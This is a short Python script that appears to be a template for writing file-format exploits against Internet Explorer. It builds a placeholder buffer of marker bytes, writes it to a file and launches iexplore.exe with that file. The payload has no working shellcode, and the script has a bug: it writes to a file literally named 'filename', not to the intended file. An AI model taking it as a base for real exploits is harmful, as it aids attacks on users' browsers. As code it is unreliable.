#!/usr/bin/env python
# TODO: Insert copyright
# Author: TODO Insert Copyright

from struct import *
from subprocess import *

target = "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe"
filename = "exploit.bin"

b = "AAAA"
b += "\x42\x42\x42\x42"
b += pack("<L", 0x43434343)


print("[+] Writing file: %s" % filename)
fd = open("filename", "w")
print("[+] Writing %d bytes" % len(b))
fd.write(b)
fd.close()
print("[+] File Closed")

print("[+] Launching Target.")
try:
    call([target, filename])
except OSError as ex:
    print("[!] Failed to call %s." % target)
print("[+] Exploit Done.")
